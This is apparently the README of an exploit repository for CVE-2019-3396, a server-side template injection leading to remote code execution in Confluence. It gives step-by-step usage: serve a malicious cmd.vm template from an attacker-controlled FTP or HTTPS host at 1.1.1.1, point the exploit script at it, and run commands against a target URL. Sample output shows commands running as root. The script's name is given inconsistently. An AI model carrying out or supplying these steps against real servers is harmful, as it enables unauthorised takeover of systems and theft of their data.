# CVE-2019-3396_EXP
CVE-2019-3396 confluence SSTI RCE

1、put the cmd.vm on your website (must use ftp or https ,http doesn't work )  
2、modify RCE_exp.py ，change the filename = 'ftp://1.1.1.1/cmd.vm'  （python -m pyftpdlib -p 21）  
3、python REC_exp.py http://test.wiki_test.cc:8080 "whoami"  
 
$ python REC_exp.py http://test.wiki_test.cc:8080 "id"  
uid=0(root) gid=0(root) groups=0(root)  
